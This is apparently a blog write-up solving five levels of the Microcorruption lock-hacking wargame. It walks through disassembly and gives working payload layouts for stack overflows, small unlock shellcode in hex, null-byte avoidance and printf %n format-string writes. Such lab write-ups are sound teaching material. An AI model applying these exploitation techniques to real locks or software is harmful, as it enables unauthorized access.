---
layout: post
title: microcorruption-ctf-johannesburg-whitehorse-montevideo-addisababa-novosibirsk
excerpt: "Writeup for microcorruption's Johannesburg, Whitehorse, Montevideo, Addis Ababa and Novosibirsk levels."
categories: [writeup]
tags: [itsec, wargame]
---

[microcorruption](http://www.microcorruption.com)

## Johannesburg ##

``` shell
     - A firmware update rejects passwords which are too long.
     - This lock is attached the the LockIT Pro HSM-1.
```  

This looks a lot like Cusco - where we allocate 63 (`0x3f`) bytes to read user input but only pop 18 off at the end - though there is some weirdness in the main function:

``` shell
4566:  b012 4644      call  #0x4446 <unlock_door>
456a:  3f40 d144      mov #0x44d1 "Access granted.", r15
456e:  023c           jmp #0x4574 <login+0x48>
4570:  3f40 e144      mov #0x44e1 "That password is not correct.", r15
4574:  b012 f845      call  #0x45f8 <puts>
4578:  f190 5c00 1100 cmp.b #0x5c, 0x11(sp)     # compare the 17th byte on sp with 0x5c
457e:  0624           jeq #0x458c <login+0x60>  # if it matches, jump to 4588
4580:  3f40 ff44      mov #0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call  #0x45f8 <puts>
4588:  3040 3c44      br  #0x443c <__stop_progExec__>
458c:  3150 1200      add #0x12, sp             # sp += 18
4590:  3041           ret
```

You can still enter passwords which are too long but the program will check that the 17th byte is equal to `0x5c` - if it isn't `__stop_progExec__` will be called, bypassing the opportunity to overwrite the return address.

Note that `0x12`, or 18 bytes, are added to `sp` before returning and popping the return address off the stack. This means our payload will be something like `<16 bytes of junk>0x5c<another byte><overwritten return address>`. For the latter we can pick `unlock_door`'s address and we're all set.

## Whitehorse ##

``` shell
    - This lock is attached the the LockIT Pro HSM-2.
    - We have updated  the lock firmware to connect with this hardware
      security module.
```

This is getting interesting. `login` looks familiar in that the number of bytes read (`0x30`) differs from the ones we pop (`0x16`). However instead of having `unlock_door` we are met with this rather annoying `conditional_unlock_door`.

``` shell
4508:  3e40 3000      mov #0x30, r14
450c:  0f41           mov sp, r15
450e:  b012 8645      call  #0x4586 <getsn>
4512:  0f41           mov sp, r15
4514:  b012 4644      call  #0x4446 <conditional_unlock_door>
4518:  0f93           tst r15
451a:  0324           jz  #0x4522 <login+0x2e>
451c:  3f40 c544      mov #0x44c5 "Access granted.", r15
4520:  023c           jmp #0x4526 <login+0x32>
4522:  3f40 d544      mov #0x44d5 "That password is not correct.", r15
4526:  b012 9645      call  #0x4596 <puts>
452a:  3150 1000      add #0x10, sp
452e:  3041           ret
```

`conditional_unlock_door` makes use of the `0x7e` interrupt to unlock the door 
``` shelll
445a:  0f12           push  r15
445c:  3012 7e00      push  #0x7e
4460:  b012 3245      call  #0x4532 <INT>
```

This interrupt interfaces with the HSM - meaning we get zero visibility on the password. Looking at the doc, we'd really want this to use `0x7f` instead, which is an unconditional unlock (no password checking). However there is no such function in the code.

But fear not! Microcorruption provides us with a way to assemble our own code. We can write our own `unlock` method:

``` shell
push #0x7f
call #0x4532
```

Assembling this gives us `30127f00b0123245`. Now the trick is to point `pc`, the program counter, to it.

There is no stack randomisation and we know exactly where our input will be - just stick a breakpoint at `0x4512`:

``` shell
> r sp 16
   3654:   7061 7373 776f 7264  password
   365c:   0000 0000 0000 0000  ........
   3664:   3c44 0000 0000 0000  <D......
```

Our input will then be `<shellcode><padding to 16 bytes><sp's address>`. Nice.

## Montevideo ##

``` shell
    - Lockitall developers  have rewritten the code  to conform to the
      internal secure development process.
    - This lock is attached the the LockIT Pro HSM-2.
```

At first glance this looks like Whitehorse with a `strcpy`:

``` shell
4508:  3e40 3000      mov #0x30, r14
450c:  3f40 0024      mov #0x2400, r15
4510:  b012 a045      call  #0x45a0 <getsn>
4514:  3e40 0024      mov #0x2400, r14
4518:  0f41           mov sp, r15
451a:  b012 dc45      call  #0x45dc <strcpy>
451e:  3d40 6400      mov #0x64, r13
```

And the same uneven pop at the end. However `strcpy` presents us with a challenge. Let's see what happens when we add in our Cusco's shellcode by putting a breakpoint at `0x451e`:

``` shell
> r sp
   43ee:   3012 7f00 0000 0000  0.....
   43f6:   0000 0000 0000 0000  ........
   43fe:   3c44 3140 0044 1542  <D1@.D.B
   4406:   5c01 75f3 35d0 085a  \.u.5..Z
```

Mmm... It looks like everything after `7f` was ignored. This is because `strcpy` stops copying data once it encounters a null byte (`0x00`). Recall that in order to call the right interrupt we pushed `0x7f` on the stack - which is really `0x7f00` in little endian!

We need to find a way to get rid of the `0x00`. Let's try the below:

``` shell
mov #0x0f70, r15
add #0xf10f, r15
```

It's overflow, but there are no null bytes. Note that if you get something like 'CPUOFF', it's probably because you inadvertly set the 4th bit of the status register (see section 3.2.3 of the TI manual).

Our instructions will look like: 

``` shell
mov #0x0f70, r15
add #0xf10f, r15
push r15
call #0x454c
```

Which assemble to `3f40700f3f500ff10f12b0124c45`. As with Cusco, we just need to pad this and add the return address pointing to our shellcode on the stack. The final input will be `<14 bytes of shellcode><2  bytes of padding><address on stack>`.


## Addis Ababa ##

``` shell
    - We have verified passwords can not be too long.
    - Usernames are printed back to the user for verification.
    - This lock is attached the the LockIT Pro HSM-1.
```

This looks like a `printf` format exploit! Though after some trial and error, the `printf` implementation is rather limited compared to the C one we're used to. However as guessed, `printf` is passed user input directly - that is, `printf(input)` as opposed to `printf('%s', input)`. This is readily observable with input such as `DD:%x`. We also note it seems we need to have a `%x` before we can use `%n`. Mmm...


As a side note, we can't mix hex and ascii in the input. As such we'll need to translate everything into hex.

We can exploit this to write to an arbitrary address - but where? There's a conditional expression (`tst  0`) that looks interesting:

``` shell
448a:  8193 0000      tst 0x0(sp)
448e:  0324           jz  #0x4496 <main+0x5e>
4490:  b012 da44      call  #0x44da <unlock_door>
4494:  053c           jmp #0x44a0 <main+0x68>
4496:  3012 1f45      push  #0x451f "That entry is not valid."
```

If `sp` is 0 (which it is if the password isn't correct), it will jump to `0x4496` - but if it isn't, `unlock_door` will be called. That means we don't even really care what we override the test value with as long as it is greater than 0.

With this in mind our input will be: `<0x448c - the address we want to overwrite>:<padding, though not necessary>%x%n` - with `%n` writing the number of bytes so far to `0x448c`. We will have essentially changed the instruction to:

``` shell
8193 0400
tst 0x4(sp)
```

Where 4 is the number of bytes written. Job done.

## Novosibirsk ##

``` shell
    - This lock is attached the the LockIT Pro HSM-2.
    - We have added features from b.03 to the new hardware.
```

This is very similar to Addis Ababa - but we're not so lucky as having `unlock_door` readily available. Instead we're met with `conditional_unlock_door` which does check a given password with the HSM. Bummer.

All is not lost however. `conditional_unlock_door` raises the following interrupt:

``` shell
44c2:  0e12           push  r14
44c4:  0f12           push  r15
44c6:  3012 7e00      push  #0x7e
44ca:  b012 3645      call  #0x4536 <INT>
```

As we know from the documentation, `0x7e` expects a password to trigger the deadbolt - but `0x7f` doesn't. Could we overwrrite `0x44c8` with `0x7f00`?

Given `printf`'s limitations we would need the ability to enter at least 127 bytes (`0x7f`) as our input.

``` shell
4454:  3e40 f401      mov #0x1f4, r14
4458:  3f40 0024      mov #0x2400, r15
445c:  b012 8a45      call  #0x458a <getsn>
```

Ha. They're giving us `0x1f4` bytes to work with. Plenty. Our input will then look like `<0x44c8 - the address of the 0x7e><padding>%x%n` such that the total length of the payload is 127.
